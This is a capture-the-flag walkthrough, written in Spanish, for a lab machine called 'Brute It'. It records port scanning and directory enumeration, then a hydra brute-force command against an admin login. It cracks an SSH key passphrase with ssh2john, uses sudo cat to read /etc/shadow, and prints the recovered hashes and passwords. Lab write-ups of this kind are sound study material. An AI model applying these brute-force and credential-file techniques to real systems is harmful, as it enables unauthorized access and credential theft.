# Brute It

## Initial Scan
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

```
## Enum
### HTTP
```
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/admin (Status: 301)
``` 
En /admin tenemos un login panel y vemos este comentario
```
    <!-- Hey john, if you do not remember, the username is admin -->
```
Tenemos el user

## Exploit
### HTTP Brute Forcing
Con el user y el endpoint podemos hacer lo siguiente:
```
hydra -l admin -P rockyou.txt 10.10.65.214 http-post-form '/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid' 
[80][http-post-form] host: 10.10.65.214   login: admin   password: xavier
```
Ahora nos podemos descargar una key para entrar con ssh, obtendremos la pass gracias a ssh2john y rockyou
```
rockinroll       (id_rsa)
```
Con eso nos podemos logear a la maquina

## Privesc
```
User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```
Con esto podemos leer /etc/shadow
```
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
thm:$6$hAlc6HXuBJHNjKzc$NPo/0/iuwh3.86PgaO97jTJJ/hmb0nPj8S/V6lZDsjUeszxFVZvuHsfcirm4zZ11IUqcoB9IEWYiCV.wcuzIZ.:18489:0:99999:7:::
```
Si lo crackeamos veremos que la contraseña del root es football
